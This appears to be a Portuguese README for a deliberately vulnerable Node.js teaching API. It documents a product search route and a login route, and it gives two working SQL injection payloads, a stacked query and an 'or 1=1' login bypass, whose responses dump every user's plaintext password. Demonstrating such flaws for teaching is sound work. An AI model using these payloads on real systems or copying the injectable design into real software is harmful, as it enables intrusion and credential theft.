# SQL_Injection

## APRESENTAÇÃO
API para exemplificar uma SQL INJECTION.

## Error Codes
** 404 - Produto não encontrado **
Não foi encontrado qualquer produto com o nome digitado

** 401 - Dados incorretos **
Login ou senha do usuários estão incorretos

## Rotas Vulneráveis

### GET - Busca produtos
Busca produtos a partir do nome passado como parâmetro.
#### Exemplo
##### Request
```HTTP
HTTP
GET /products/camiseta HTTP/1.1
Host: localhost:3000
```
##### Response
body
```HTTP
json
[
  {
    "id": 1,
    "nome": "camiseta",
    "descricao": "lorem ipsum",
    "preco": 20.5
  },
  {
    "id": 2,
    "nome": "camiseta",
    "descricao": "lorem ipsum",
    "preco": 25
  }
]
```

### POST - LOGIN
Verifica se o usuário existe a partir do login e senha passados no corpo da requisição.
#### Exemplo
##### Request
```HTTP
HTTP
POST /login HTTP/1.1
Host: localhost:3000
Content-Length: 57

{
    "login": "userlogin",
    "senha": "senhasecreta"
}
```
##### Response
body
```HTTP
json
[
    {
        "id": 2,
        "nome": "Usuario 1",
        "login": "userlogin",
        "senha": "senhasecreta"
    }
]
```
## Instruções para executar o projeto
### 1) Clone o projeto.
`git clone https://github.com/Luizebmartins/SQL_Injection.git`
### 2) Entre na pasta do projeto.
`cd SQL_Injection`
### 3) Instale as depend&ecirc;ncias.
`npm i`

### 4) execute o projeto.
`node server/app.js`

## Exemplos de SQL Injection que funcionam no projeto
### GET - Busca produtos
##### Request
```HTTP
HTTP
GET /products/camiseta'; select * from usuarios; -- HTTP/1.1
Host: localhost:3000
```
##### Response
body
```HTTP
json
[
    {
        "id": 1,
        "nome": "admin",
        "login": "admin",
        "senha": "secrepassword"
    },
    {
        "id": 2,
        "nome": "Usuario 1",
        "login": "userlogin",
        "senha": "senhasecreta"
    },
    {
        "id": 3,
        "nome": "Usuario 2",
        "login": "superlogin",
        "senha": "incrivelsenha"
    }
]
```

### POST - LOGIN
##### Request
```HTTP
HTTP
POST /login HTTP/1.1
Host: localhost:3000
Content-Length: 68

{
    "login": "userlogin' or 1=1;--",
    "senha": "senhasecreta"
}
```
##### Response
body
```HTTP
json
[
    {
        "id": 1,
        "nome": "admin",
        "login": "admin",
        "senha": "secrepassword"
    },
    {
        "id": 2,
        "nome": "Usuario 1",
        "login": "userlogin",
        "senha": "senhasecreta"
    },
    {
        "id": 3,
        "nome": "Usuario 2",
        "login": "superlogin",
        "senha": "incrivelsenha"
    }
]
```
